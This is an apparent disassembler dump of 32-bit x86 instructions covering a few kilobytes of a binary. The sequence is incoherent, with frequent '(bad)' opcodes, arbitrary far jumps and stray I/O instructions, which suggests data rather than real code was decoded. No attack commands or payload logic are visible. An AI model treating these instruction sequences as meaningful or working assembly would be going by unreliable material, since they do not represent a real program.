  4223c2:	sub    ecx,DWORD PTR [edx-0xb73243d]
  4223c8:	xchg   dh,bl
  4223ca:	xor    ecx,DWORD PTR [edx-0x17]
  4223cd:	and    ebx,0xc
  4223d0:	jmp    0xedc7:0x1c6137b1
  4223d7:	loopne 0x4223ab
  4223d9:	test   BYTE PTR [ebp+0x48cec036],0x51
  4223e0:	pop    ecx
  4223e1:	push   ebp
  4223e2:	lahf   
  4223e3:	cdq    
  4223e4:	mov    BYTE PTR [esi+0x2b],bh
  4223e7:	jns    0x422421
  4223e9:	push   es
  4223ea:	hlt    
  4223eb:	push   esi
  4223ec:	js     0x422469
  4223ee:	loop   0x42241c
  4223f0:	fisub  DWORD PTR [ecx-0x4b18e715]
  4223f6:	jo     0x4223fa
  4223f8:	jne    0x42238c
  4223fa:	(bad)
  4223fd:	(bad)  
  4223fe:	into   
  4223ff:	add    ah,BYTE PTR [edx-0x2461f454]
  422405:	jae    0x422458
  422407:	sbb    bh,bl
  422409:	push   edi
  42240a:	aam    0xe7
  42240c:	or     eax,DWORD PTR [ebx+0x46]
  42240f:	std    
  422410:	out    dx,al
	...
  422471:	add    BYTE PTR [eax],al
  422473:	add    BYTE PTR [edx-0x7e],dl
  422476:	cs imul edi,esi,0xbbbb57ed
  42247d:	xor    ebp,esp
  42247f:	cdq    
  422480:	test   al,0xf5
  422482:	int    0x51
  422484:	fldcw  WORD PTR [ebp+0x1]
  422487:	add    BYTE PTR ds:0x63000001,al
  42248d:	sub    ch,BYTE PTR [edi-0x10303073]
  422493:	frstor [esp+ecx*4+0x5a]
  422497:	shl    BYTE PTR [edx-0x33],0xf1
  42249b:	cmp    eax,0x7b4e6cf6
  4224a0:	in     eax,dx
  4224a1:	ja     0x4224b3
  4224a3:	cs inc edx
  4224a5:	fmul   st,st(7)
  4224a7:	out    0xef,eax
  4224a9:	sbb    ecx,DWORD PTR [eax-0x55]
  4224ac:	retf   0xa071
  4224af:	mov    bh,BYTE PTR [ecx+0x3c]
  4224b2:	sub    al,0x2e
  4224b4:	jp     0x4224ef
  4224b6:	stc    
  4224b7:	xchg   BYTE PTR [edx],bh
  4224b9:	in     al,dx
  4224ba:	xchg   edx,eax
  4224bb:	aas    
  4224bc:	jbe    0x4224b7
  4224be:	xchg   ebp,eax
  4224bf:	clc    
  4224c0:	cli    
  4224c1:	push   ecx
  4224c2:	mov    BYTE PTR [ebx-0x69852861],al
  4224c8:	mov    ds,ecx
  4224ca:	mov    edx,0xcaf5bad3
  4224cf:	jne    0x422478
  4224d1:	and    DWORD PTR [ebx+0x18],esi
  4224d4:	add    ebx,DWORD PTR [edi+0x21]
  4224d7:	mov    ebp,0x22c66adb
  4224dc:	cmp    DWORD PTR [esi+0x6c415d5c],ebp
  4224e2:	xchg   ebp,eax
  4224e3:	mov    esp,0x966272c2
  4224e8:	xchg   esi,eax
  4224e9:	mov    DWORD PTR [edx-0x316feff8],esi
  4224ef:	cwde   
  4224f0:	mov    edi,0x6c2431d5
  4224f5:	mov    ecx,0x958b0269
  4224fa:	out    0x8e,eax
  4224fc:	test   al,0x80
  4224fe:	iret   
  4224ff:	adc    esp,eax
  422501:	stos   DWORD PTR es:[edi],eax
  422502:	mov    ebx,0x9347a4bf
  422507:	clc    
  422508:	repnz push 0x8d70673
  42250e:	popa   
  42250f:	loop   0x422513
  422511:	xchg   DWORD PTR [esi],ebx
  422513:	in     al,dx
  422514:	push   0x17
  422516:	jns    0x4224b4
  422518:	into   
  422519:	adc    BYTE PTR [esi],al
  42251b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251c:	push   ebp
  42251d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42251e:	or     BYTE PTR [esi+0x1f],ch
  422521:	fs pop ss
  422523:	mov    ch,0xff
  422525:	add    al,0xf
  422527:	arpl   WORD PTR [eax-0xa],dx
  42252a:	xlat   BYTE PTR ds:[ebx]
  42252b:	cmp    DWORD PTR [edx],0x9b65a4d5
  422531:	lock ins BYTE PTR es:[edi],dx
  422533:	sbb    edi,DWORD PTR [ebx-0xb]
  422536:	stos   BYTE PTR es:[edi],al
  422537:	fisttp QWORD PTR [esi+0x71]
  42253a:	add    bh,dl
  42253c:	ins    DWORD PTR es:[edi],dx
  42253d:	pop    esi
  42253e:	or     al,0x2c
  422540:	cs daa 
  422542:	xchg   edi,eax
  422543:	(bad)  [ebp+0x6d]
  422546:	lds    edx,FWORD PTR es:[edi+edx*8+0x4b]
  42254b:	add    BYTE PTR [eax+0x75],al
  42254e:	mov    eax,ds:0x886b04c5
  422553:	pop    ss
  422554:	jmp    0x1272:0x4351ceb3
  42255b:	add    cl,0xd3
  42255e:	and    BYTE PTR [edx-0x15fe1a52],dh
  422564:	mov    ds:0xa5b81a70,eax
  422569:	(bad)  
  42256a:	repnz outs dx,DWORD PTR ds:[esi]
  42256c:	call   0x5c342c9e
  422571:	sahf   
  422572:	hlt    
  422573:	xor    eax,0x2be87230
  422578:	adc    BYTE PTR [eax+0x4c954afa],ch
  42257e:	adc    dh,bl
  422580:	leave  
  422581:	je     0x422585
  422583:	mov    BYTE PTR [ebx],ch
  422585:	jg     0x42258f
  422587:	pop    esp
  422588:	stos   BYTE PTR es:[edi],al
  422589:	lock mov dh,0xab
  42258c:	xor    BYTE PTR [ebp+0x6c],al
  42258f:	(bad)  
	...
  4225f1:	add    BYTE PTR [eax],al
  4225f3:	add    BYTE PTR [edx-0x40887052],bl
  4225f9:	ja     0x4225f5
  4225fb:	out    dx,eax
  4225fc:	sbb    esi,DWORD PTR [ecx+0x5f94a2f8]
  422602:	(bad)
  422607:	add    BYTE PTR ds:0x9d000001,al
  42260d:	daa    
  42260e:	fst    DWORD PTR [eax]
  422610:	in     al,dx
  422611:	add    eax,0xcde6f34c
  422616:	mov    ah,0x73
  422618:	push   es
  422619:	xchg   DWORD PTR [eax],eax
  42261b:	jge    0x4225b2
  42261d:	shl    BYTE PTR [eax-0x2b3d8b9d],0xd1
  422624:	adc    edx,DWORD PTR [ebx-0x1c]
  422627:	popf   
  422628:	shl    DWORD PTR [eax],1
  42262a:	cmp    BYTE PTR [edi-0x4eb840bb],bl
  422630:	js     0x422664
  422632:	and    dh,BYTE PTR ds:0xfacb94fa
  422638:	push   ss
  422639:	jmp    0xbee7:0x7354c386
  422640:	les    eax,FWORD PTR [ebx]
  422642:	stos   BYTE PTR es:[edi],al
  422643:	hlt    
  422644:	lahf   
  422645:	jge    0x422682
  422647:	mov    dh,0x30
  422649:	add    BYTE PTR [edi-0x72],dh
  42264c:	mov    bl,0xed
  42264e:	xchg   ebx,eax
  42264f:	add    eax,0xc502dfdc
  422654:	sbb    eax,0x3fc7e6e8
  422659:	nop
  42265a:	ret    
  42265b:	mov    ds:0xfef6f2,al
  422660:	popa   
  422661:	sar    BYTE PTR [ecx],1
  422663:	ins    DWORD PTR es:[edi],dx
  422664:	(bad)  
  422665:	jg     0x42262d
  422667:	mov    esi,esp
  422669:	pusha  
  42266a:	cmp    bh,BYTE PTR [ecx]
  42266c:	push   ds
  42266d:	or     dh,BYTE PTR [edx*2+0xd6502f8]
  422674:	retf   0x8a21
  422677:	scas   al,BYTE PTR es:[edi]
  422678:	stos   DWORD PTR es:[edi],eax
  422679:	push   0x35fc5f33
  42267e:	sbb    al,0x9e
  422680:	mov    dh,0x34
  422682:	loope  0x422658
  422684:	cmc    
  422685:	push   ebx
  422686:	sbb    DWORD PTR [edx-0x3af36f41],ebx
  42268c:	rcr    BYTE PTR [edi+esi*8+0x365e1123],1
  422693:	xor    bh,BYTE PTR [esi-0x16]
  422696:	data16 test cl,bh
  422699:	data16 test BYTE PTR [eax+eax*8-0x1aeeaa19],0x51
  4226a2:	adc    al,BYTE PTR [ebp+0x25]
  4226a5:	xor    esp,edx
  4226a7:	pop    esp
  4226a8:	push   ss
  4226a9:	and    dl,BYTE PTR [eax-0x75]
  4226ac:	mov    ebp,DWORD PTR [ebx]
  4226ae:	dec    ebp
  4226af:	in     eax,0x33
  4226b1:	ins    BYTE PTR es:[edi],dx
  4226b2:	cmp    cl,dl
  4226b4:	jno    0x42266a
  4226b6:	(bad)  
  4226b7:	pop    edi
  4226b8:	add    al,0x23
  4226ba:	int    0x4a
  4226bc:	sbb    al,0x28
  4226be:	push   esi
  4226bf:	(bad)  
  4226c0:	or     DWORD PTR [eax+0x2c906629],esi
  4226c6:	push   ss
  4226c7:	repz and DWORD PTR [esi-0x2],esp
  4226cb:	mov    esi,0x92f1d134
  4226d0:	mov    ds:0xb48b3a0a,al
  4226d5:	mov    ds:0x1c03ddac,al
  4226da:	ds push eax
  4226dc:	sbb    dh,BYTE PTR [edi-0x2f]
  4226df:	test   al,0xc6
  4226e1:	ret    
  4226e2:	jb     0x42270d
  4226e4:	mov    esp,esp
  4226e6:	test   DWORD PTR [edx-0x29],esi
  4226e9:	mov    BYTE PTR [edx-0x66bd7469],bl
  4226ef:	cmp    al,0x36
  4226f1:	fidivr WORD PTR [eax+0x4e32a5af]
  4226f7:	push   ecx
  4226f8:	pop    ss
  4226f9:	dec    esi
  4226fa:	(bad)  
  4226fb:	rcl    BYTE PTR [edx+0x5002c3b5],cl
  422701:	popf   
  422702:	leave  
  422703:	push   ebp
  422704:	jp     0x4226e3
  422706:	arpl   bx,si
  422708:	and    al,0x47
  42270a:	cmp    DWORD PTR [ecx],0xffffffb9
  42270d:	dec    esp
  42270e:	xor    eax,0x146b
	...
  422773:	add    BYTE PTR [edi],ah
  422775:	sub    eax,0x7d7f2d7d
  42277a:	ja     0x4227ab
  42277c:	mov    esi,0x237f01c8
  422781:	mov    ds:0x6fe3a1b9,al
  422786:	add    DWORD PTR [eax],eax
  422788:	add    eax,0x43000001
  42278d:	xor    cl,BYTE PTR ds:[ecx+ecx*2+0x45cc41dc]
  422795:	push   edi
  422796:	add    BYTE PTR [eax+0x452e6b59],cl
  42279c:	sbb    al,0xb9
  42279e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42279f:	outs   dx,DWORD PTR ds:[esi]
  4227a0:	imul   eax,DWORD PTR ds:0xbdef2cf6,0xffffffcd
  4227a7:	int3   
  4227a8:	xor    eax,0x6b878446
  4227ad:	xor    bl,BYTE PTR [edx-0x4d]
  4227b0:	jmp    0x1229:0x65fffe13
  4227b7:	pop    edi
  4227b8:	push   esi
  4227b9:	push   ds
  4227ba:	pop    ss
  4227bb:	dec    ebx
  4227bc:	jl     0x422752
  4227be:	retf   
  4227bf:	out    0x1b,al
  4227c1:	sub    al,0x2a
  4227c3:	mov    ebp,esi
  4227c5:	clc    
  4227c6:	sub    BYTE PTR [ebx-0x3b83fb47],0x18
  4227cd:	aad    0x3
  4227cf:	push   cs
  4227d0:	cli    
  4227d1:	mov    edi,0x5566adf8
  4227d6:	test   eax,0x69802953
  4227db:	xchg   esi,eax
  4227dc:	sbb    BYTE PTR [ebx+0x5361cde1],0xb
  4227e3:	sub    eax,0xe58b3672
  4227e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227e9:	adc    BYTE PTR [edx+eiz*1+0x7d561e68],ah
  4227f0:	jmp    0x422867
  4227f2:	jp     0x422831
  4227f4:	inc    esi
  4227f5:	add    DWORD PTR [eax-0x577a8644],ecx
  4227fb:	inc    edx
  4227fc:	jbe    0x422868
  4227fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4227ff:	xor    eax,0xdcd2a56a
  422804:	inc    edx
  422805:	scas   eax,DWORD PTR es:[edi]
  422806:	idiv   ebx
  422808:	sahf   
  422809:	mov    edi,0x204f3a3f
  42280e:	push   cs
  42280f:	aam    0xcf
  422811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422812:	pop    edi
  422813:	ret    
  422814:	pop    ecx
  422815:	lods   al,BYTE PTR ds:[esi]
  422816:	and    dh,BYTE PTR [esi-0x66]
  422819:	and    al,BYTE PTR [edi]
  42281b:	cmp    DWORD PTR [ebx-0x69],eax
  42281e:	enter  0x6f65,0x5e
  422822:	or     DWORD PTR [ebp-0x4d],edx
  422825:	stc    
  422826:	cmp    eax,0x7c74e107
  42282b:	stos   DWORD PTR es:[edi],eax
  42282c:	push   ecx
  42282d:	retf   0xb727
  422830:	and    DWORD PTR [esi],0xffffffa1
  422833:	jmp    0x778afb14
  422838:	mov    dl,0x4
  42283a:	shl    BYTE PTR [edx+0x7f],cl
  42283d:	sbb    BYTE PTR [eax+edx*8],ch
  422840:	or     eax,0x9d85734b
  422845:	mov    ch,0x7c
  422847:	repz dec edi
  422849:	in     eax,0x37
  42284b:	cwde   
  42284c:	retf   
  42284d:	cmp    al,0x56
  42284f:	jne    0x422891
  422851:	out    0xfa,al
  422853:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422854:	mov    cl,0xff
  422856:	test   DWORD PTR [ebp+0x59],edi
  422859:	lods   al,BYTE PTR ds:[esi]
  42285a:	test   BYTE PTR [edi],dh
  42285c:	das    
  42285d:	loope  0x4228cb
  42285f:	push   ecx
  422860:	push   0xffffff80
  422862:	dec    edx
  422863:	push   ebx
  422864:	call   0x54bf49dd
  422869:	add    DWORD PTR [edi+0x3a],esp
  42286c:	xchg   esi,eax
  42286d:	outs   dx,BYTE PTR ds:[esi]
  42286e:	push   edi
  42286f:	stos   DWORD PTR es:[edi],eax
  422870:	adc    eax,0x83e13373
  422875:	out    dx,eax
  422876:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422877:	(bad)  [ebx+0x63]
  42287a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42287b:	rcl    BYTE PTR [edi-0x2c2e1ccf],0x7f
  422882:	sub    eax,0x8716a4e8
  422887:	in     eax,dx
  422888:	xchg   DWORD PTR [ebx-0x68bbb527],ebp
  42288e:	inc    ecx
  42288f:	xchg   esi,eax
  422890:	jns    0x422892
	...
  4228f2:	add    BYTE PTR [eax],al
  4228f4:	int    0x39
  4228f6:	mov    eax,0xef97fc97
  4228fb:	jnp    0x4228bb
  4228fd:	outs   dx,DWORD PTR ds:[esi]
  4228fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4228ff:	loopne 0x4228f7
  422901:	and    al,0xb8
  422903:	pop    ebp
  422904:	call   0x5422a79
  422909:	add    DWORD PTR [eax],eax
  42290b:	add    BYTE PTR ds:0xaeeee2bb,bh
  422911:	or     dh,BYTE PTR ss:[edx+0x652ef9c0]
  422918:	push   edx
  422919:	mov    al,ds:0xfad2e1c5
  42291e:	mov    dh,0x33
  422920:	pop    ebx
  422921:	xchg   edi,eax
  422922:	pop    esp
  422923:	pop    ss
  422924:	mov    edi,ecx
  422926:	mov    BYTE PTR [esi+0x7c],dh
  422929:	xor    esi,esi
  42292b:	cmp    ecx,esp
  42292d:	lock imul ebp
  422930:	pop    edx
  422931:	mov    ah,0xa8
  422933:	arpl   WORD PTR [eax+0x0],sp
  422936:	jmp    0x9c7c:0x8e9381e0
  42293d:	fisub  WORD PTR [edi-0x5f]
  422940:	cli    
  422941:	or     BYTE PTR [ebx+0x27],0xf8
  422945:	dec    esp
  422946:	test   BYTE PTR [edx+ebx*1],cl
  422949:	rcr    BYTE PTR ds:0xe36cac20,0xe8
  422950:	sub    DWORD PTR [ecx-0x15],ebx
  422953:	neg    BYTE PTR [ebp+esi*4-0x2037548]
  42295a:	cmp    DWORD PTR [ebx+0x54],ebp
  42295d:	enter  0xf5b,0xd8
  422961:	out    0xea,al
  422963:	jbe    0x42299b
  422965:	div    DWORD PTR [esi]
  422967:	fist   WORD PTR [ecx+0x5e7d521]
  42296d:	jecxz  0x4229bf
  42296f:	in     al,dx
  422970:	sub    edx,DWORD PTR [edi+esi*2]
  422973:	add    DWORD PTR [esi],edx
  422975:	imul   DWORD PTR [esp+ebp*2+0x10]
  422979:	push   ecx
  42297a:	stc    
  42297b:	adc    al,0x1d
  42297d:	arpl   bx,dx
  42297f:	pop    ebp
  422980:	push   es
  422981:	push   edi
  422982:	fild   QWORD PTR [edi+eiz*2]
  422985:	lock and bl,BYTE PTR fs:[ecx-0x581dae17]
  42298d:	push   ecx
  42298e:	mov    edx,0x83ecf4e6
  422993:	aam    0xf1
  422995:	push   es
  422996:	and    cl,BYTE PTR [esi-0x31086794]
  42299c:	lahf   
  42299d:	fs in  eax,dx
  42299f:	leave  
  4229a0:	stos   DWORD PTR es:[edi],eax
  4229a1:	int3   
  4229a2:	sbb    DWORD PTR [eax-0x7c],esp
  4229a5:	and    ebp,DWORD PTR [ebp-0x53fcc321]
  4229ab:	not    DWORD PTR [edi+edi*2-0x12]
  4229af:	lea    ebp,[ecx+0x29dee891]
  4229b5:	mov    edi,0x5a084900
  4229ba:	cld    
  4229bb:	xchg   ecx,eax
  4229bc:	shl    DWORD PTR [edi-0xa],1
  4229bf:	sti    
  4229c0:	jg     0x4229af
  4229c2:	rcr    ebp,0xea
  4229c5:	loope  0x4229db
  4229c7:	aas    
  4229c8:	mov    ebx,0x996e05a0
  4229cd:	mov    DWORD PTR [ebx+0x16],0x9629a3cb
  4229d4:	adc    ebx,DWORD PTR [esi+0x7e]
  4229d7:	and    DWORD PTR [edx],ebx
  4229d9:	cmp    BYTE PTR [ebx],0x25
  4229dc:	dec    esi
  4229dd:	dec    ebx
  4229de:	leave  
  4229df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4229e0:	sbb    ebp,edi
  4229e2:	outs   dx,DWORD PTR ds:[esi]
  4229e3:	mov    ah,0x7e
  4229e5:	mov    ebx,DWORD PTR ds:0x56ff4420
  4229eb:	inc    ax
  4229ed:	add    edi,ecx
  4229ef:	repnz out dx,eax
  4229f1:	leave  
  4229f2:	inc    esi
  4229f3:	inc    edi
  4229f4:	inc    ebx
  4229f5:	dec    esp
  4229f6:	dec    ecx
  4229f7:	mov    BYTE PTR [eax+eiz*4+0x4e],ah
  4229fb:	dec    edi
  4229fc:	adc    eax,0x93d7f449
  422a01:	(bad)  
  422a02:	xor    eax,0x7acf22a6
  422a07:	dec    ebx
  422a08:	es mov bl,0x65
  422a0b:	mov    ds:0x8aaab730,al
  422a10:	aas    
	...
  422a71:	add    BYTE PTR [eax],al
  422a73:	add    BYTE PTR [esi-0x377e796],dl
  422a79:	cli    
  422a7a:	xchg   esi,eax
  422a7b:	jle    0x422a4e
  422a7d:	push   esp
  422a7e:	je     0x422a3d
  422a80:	scas   al,BYTE PTR es:[edi]
  422a81:	xchg   ax,ax
  422a83:	lock in eax,dx
  422a85:	jno    0x422a88
  422a87:	add    BYTE PTR ds:0xe0000001,al
  422a8d:	enter  0x92aa,0x12
  422a91:	mov    ebx,0xe7757413
  422a96:	xchg   esi,eax
  422a97:	pop    edx
  422a98:	push   edx
  422a99:	mov    eax,0x881b0d40
  422a9e:	dec    ebp
  422a9f:	sub    eax,0x3b58a33e
  422aa4:	push   esi
  422aa5:	jle    0x422a9c
  422aa7:	and    BYTE PTR [edi],al
  422aa9:	mov    al,0xf2
  422aab:	sub    DWORD PTR [ecx+eax*1+0x7],0x7f8dac55
  422ab3:	adc    eax,0xf63eca94
  422ab8:	dec    ebx
  422ab9:	retf   
  422aba:	sbb    DWORD PTR [ecx-0x44297e4c],eax
  422ac0:	push   0x7
  422ac2:	push   ebx
  422ac3:	iret   
  422ac4:	add    al,BYTE PTR [edi+0x29e009ac]
  422aca:	sbb    eax,0xa72e5895
  422acf:	int    0x85
  422ad1:	cmp    edx,DWORD PTR [esi+0xb]
  422ad4:	pushf  
  422ad5:	pop    ss
  422ad6:	ret    
  422ad7:	outs   dx,BYTE PTR ds:[esi]
  422ad8:	(bad)  
  422ad9:	das    
  422ada:	aaa    
  422adb:	xor    eax,0x5ef7191f
  422ae0:	ret    0xb310
  422ae3:	mov    cl,0x9
  422ae5:	and    dh,dh
  422ae7:	sub    ah,BYTE PTR [ebx]
  422ae9:	jnp    0x422aa0
  422aeb:	leave  
  422aec:	stos   BYTE PTR es:[edi],al
  422aed:	lahf   
  422aee:	fisubr DWORD PTR [esi]
  422af0:	adc    DWORD PTR [ebp+0x3f],ebp
  422af3:	mov    al,0x31
  422af5:	mov    al,ds:0xf84ecd6d
  422afa:	call   0x77237725
  422aff:	(bad)  
  422b00:	in     al,0x12
  422b02:	jns    0x422a9d
  422b04:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b06:	gs jns 0x422b5a
  422b09:	data16 shr BYTE PTR [edi+esi*2],0xd8
  422b0e:	into   
  422b0f:	ins    DWORD PTR es:[edi],dx
  422b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b12:	lea    edi,[ebx]
  422b14:	sar    BYTE PTR [edx+0x51f847d8],cl
  422b1a:	cld    
  422b1b:	sub    DWORD PTR [edi+0x27d17cca],ebx
  422b21:	popa   
  422b22:	adc    eax,0x661914c9
  422b27:	lods   eax,DWORD PTR ds:[esi]
  422b28:	and    al,0x7a
  422b2a:	pop    edx
  422b2b:	jecxz  0x422b24
  422b2d:	push   ss
  422b2e:	shr    BYTE PTR [edx-0x28],cl
  422b31:	dec    eax
  422b32:	(bad)  
  422b33:	sub    BYTE PTR [ebx-0x10c25cfc],cl
  422b39:	ins    BYTE PTR es:[edi],dx
  422b3a:	into   
  422b3b:	sub    dl,BYTE PTR [edx]
  422b3d:	(bad)  
  422b3e:	js     0x422b18
  422b40:	pop    edi
  422b41:	push   eax
  422b42:	fadd   QWORD PTR [edi+0x49]
  422b45:	nop
  422b46:	mov    WORD PTR [esi+ecx*1-0x2d1572af],?
  422b4d:	stc    
  422b4e:	rcl    BYTE PTR [ecx-0x68],0xbc
  422b52:	js     0x422bc9
  422b54:	push   eax
  422b55:	ret    
  422b56:	xchg   esi,eax
  422b57:	and    ch,BYTE PTR [edi+0x765e475c]
  422b5d:	or     bl,BYTE PTR [esp+ecx*8+0x19c6505]
  422b64:	jb     0x422b13
  422b66:	jecxz  0x422bd5
  422b68:	mov    al,0xdb
  422b6a:	cmp    cl,BYTE PTR [esi+0x65843dcb]
  422b70:	dec    esp
  422b71:	inc    edx
  422b72:	mov    cl,0xbe
  422b74:	fwait
  422b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b76:	or     al,0x39
  422b78:	mov    ebp,0xee2aaf20
  422b7d:	aam    0x3f
  422b7f:	adc    al,0x6d
  422b81:	call   0x3db4ddb0
  422b86:	fild   DWORD PTR [esi+0x76]
  422b89:	dec    esi
  422b8a:	or     eax,0x174db47f
  422b8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b90:	cmc    
	...
  422bf1:	add    BYTE PTR [eax],al
  422bf3:	add    BYTE PTR [edi+esi*1+0x4a],al
  422bf7:	fwait
  422bf8:	jnp    0x422bf9
  422bfa:	aad    0xff
  422bfc:	sbb    dl,BYTE PTR [edx-0x12adb264]
  422c02:	fs push ebp
  422c04:	bnd jb 0x422c08
  422c07:	add    BYTE PTR ds:0xb0000001,al
  422c0d:	mov    ebx,0x186942d3
  422c12:	pop    edi
  422c13:	sbb    BYTE PTR [edx+ebp*1+0x53],0x8b
  422c18:	and    eax,0x79c26f20
  422c1d:	(bad)  
  422c1e:	adc    eax,0x5e851383
  422c23:	or     DWORD PTR [esi-0x1eafbfdf],0x3bb46f9b
  422c2d:	outs   dx,BYTE PTR ds:[esi]
  422c2e:	dec    ebp
  422c2f:	jmp    0x7493:0xca104e68
  422c36:	xor    al,0xb0
  422c38:	popa   
  422c39:	cmp    edx,DWORD PTR [edx]
  422c3b:	in     al,0x6c
  422c3d:	mov    ah,0xd3
  422c3f:	mov    esp,0x90049894
  422c44:	and    eax,0xac6ef861
  422c49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4a:	xchg   DWORD PTR [edi-0x3f],ecx
  422c4d:	sbb    bh,ah
  422c4f:	pop    eax
  422c50:	ret    0xfb4b
  422c53:	ficom  DWORD PTR ds:[eax+0x71]
  422c57:	xor    edx,ebp
  422c59:	shl    DWORD PTR [ebp+0x577cddb7],1
  422c5f:	lds    ebp,FWORD PTR [ebx]
  422c61:	adc    BYTE PTR [ecx-0x8],cl
  422c64:	(bad)  
  422c65:	push   ebx
  422c66:	(bad)  
  422c69:	mov    esp,0xa189f30e
  422c6e:	or     BYTE PTR [eax],al
  422c70:	aas    
  422c71:	xor    eax,0x5b5db58c
  422c76:	cmp    DWORD PTR [ebx+ebp*2-0x14],esp
  422c7a:	int    0xc5
  422c7c:	imul   esp,DWORD PTR [edx],0xffffffe8
  422c7f:	enter  0x3275,0xa4
  422c83:	jmp    0x4d25:0xfec4fa70
  422c8a:	mov    ebx,0xf4fb6603
  422c8f:	adc    esi,DWORD PTR [ebx+eiz*2+0x4c]
  422c93:	xchg   DWORD PTR [edi+0x6],ebx
  422c96:	cmp    ebp,ebp
  422c98:	stos   BYTE PTR es:[edi],al
  422c99:	fstp   DWORD PTR [edx-0x61]
  422c9c:	inc    ecx
  422c9d:	mov    edx,0xc2dfd2a6
  422ca2:	daa    
  422ca3:	and    eax,0xa742959f
  422ca8:	cmc    
  422ca9:	push   ss
  422caa:	ins    DWORD PTR es:[edi],dx
  422cab:	pop    ebx
  422cac:	dec    DWORD PTR [ebp-0x49]
  422caf:	pop    ebp
  422cb0:	add    DWORD PTR [ebx-0x61],ecx
  422cb3:	loop   0x422c8d
  422cb5:	xchg   ebx,eax
  422cb6:	nop
  422cb7:	loop   0x422c3b
  422cb9:	sahf   
  422cba:	jecxz  0x422cff
  422cbc:	in     eax,0xe
  422cbe:	scas   al,BYTE PTR es:[edi]
  422cbf:	inc    ebp
  422cc0:	adc    esi,edx
  422cc2:	mov    ebp,eax
  422cc4:	mov    bl,BYTE PTR [eax+edi*2-0x70]
  422cc8:	(bad)  
  422cc9:	jo     0x422ce8
  422ccb:	ret    0x1a26
  422cce:	dec    eax
  422ccf:	xchg   ebx,eax
  422cd0:	mov    dl,0x86
  422cd2:	ret    
  422cd3:	add    al,0x72
  422cd5:	cld    
  422cd6:	and    ebx,eax
  422cd8:	cli    
  422cd9:	adc    esp,DWORD PTR [ebx]
  422cdb:	(bad)  
  422cdc:	mov    eax,0xf4175f6a
  422ce1:	mov    esi,0x84fb5ca2
  422ce6:	xor    al,0xcf
  422ce8:	jns    0x422cab
  422cea:	jg     0x422d02
  422cec:	mov    WORD PTR [ecx-0x1c],ds
  422cef:	test   DWORD PTR [eax+0x3d],esi
  422cf2:	lods   eax,DWORD PTR ds:[esi]
  422cf3:	sub    al,0xae
  422cf5:	loopne 0x422d61
  422cf7:	xor    DWORD PTR [edx+eiz*1-0x5a],0x7f
  422cfc:	mov    bl,0x17
  422cfe:	mov    dl,0x5b
  422d00:	mov    cl,0x3d
  422d02:	sbb    eax,0xfa598646
  422d07:	push   ds
  422d08:	or     DWORD PTR [ecx+0x7a],eax
  422d0b:	mov    al,0x6a
  422d0d:	ret    0x6579
  422d10:	ins    BYTE PTR es:[edi],dx
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    edx,DWORD PTR [ebp-0xb]
  422d82:	jg     0x422d29
  422d84:	div    DWORD PTR [ebx+0x1]
  422d87:	add    BYTE PTR ds:0x49000001,al
  422d8d:	sbb    eax,0x96e21fce
  422d92:	inc    ebp
  422d93:	fs js  0x422d8c
  422d96:	push   cs
  422d97:	push   ebx
  422d98:	pop    ecx
  422d99:	addr16 std 
  422d9b:	push   cs
  422d9c:	push   ecx
  422d9d:	sbb    DWORD PTR [eax],ecx
  422d9f:	mov    BYTE PTR [ecx],cl
  422da1:	in     eax,dx
  422da2:	enter  0xbf2d,0x40
  422da6:	mov    ds:0x67b919ea,al
  422dab:	in     ax,0xa1
  422dae:	mov    edx,0xbd08a6cf
  422db3:	fcmovne st,st(6)
  422db5:	into   
  422db6:	push   ds
  422db7:	inc    ecx
  422db8:	cmp    bh,BYTE PTR [eax+0x7141e12a]
  422dbe:	cmp    DWORD PTR [eax-0x66397361],edi
  422dc4:	pop    ecx
  422dc5:	xchg   BYTE PTR [eax+0x36],bl
  422dc8:	sbb    eax,0x251f8691
  422dcd:	cwde   
  422dce:	sub    eax,0x58826caf
  422dd3:	addr16 jne 0x422e22
  422dd6:	fucomp st(2)
  422dd8:	(bad)  
  422dd9:	lods   eax,DWORD PTR ds:[esi]
  422dda:	and    edx,DWORD PTR [edx]
  422ddc:	test   al,0xb2
  422dde:	sub    eax,0x313ad38d
  422de3:	or     ch,BYTE PTR [ebp-0x5357c054]
  422de9:	pusha  
  422dea:	test   eax,0x56a21db2
  422def:	push   esp
  422df0:	sub    bl,dl
  422df2:	dec    eax
  422df3:	jns    0x422dd2
  422df5:	push   ecx
  422df6:	cmp    al,0x18
  422df8:	push   0x4a2863dc
  422dfd:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  422dff:	(bad)  
  422e00:	xlat   BYTE PTR ds:[ebx]
  422e01:	mov    bl,0x48
  422e03:	int3   
  422e04:	int3   
  422e05:	pusha  
  422e06:	popa   
  422e07:	inc    edx
  422e08:	nop
  422e09:	stos   DWORD PTR es:[edi],eax
  422e0a:	xor    esp,ecx
  422e0c:	add    eax,0xd1c0c2b3
  422e11:	adc    eax,0x44f8524
  422e16:	ja     0x422de3
  422e18:	and    ah,BYTE PTR [edi-0x13c0cb44]
  422e1e:	jl     0x422e18
  422e20:	mov    DWORD PTR [eax+0x46],ebp
  422e23:	shr    BYTE PTR [esi+edx*2],1
  422e26:	add    ebx,DWORD PTR [ebx-0x1a]
  422e29:	fnstenv [ecx]
  422e2b:	in     eax,0xd
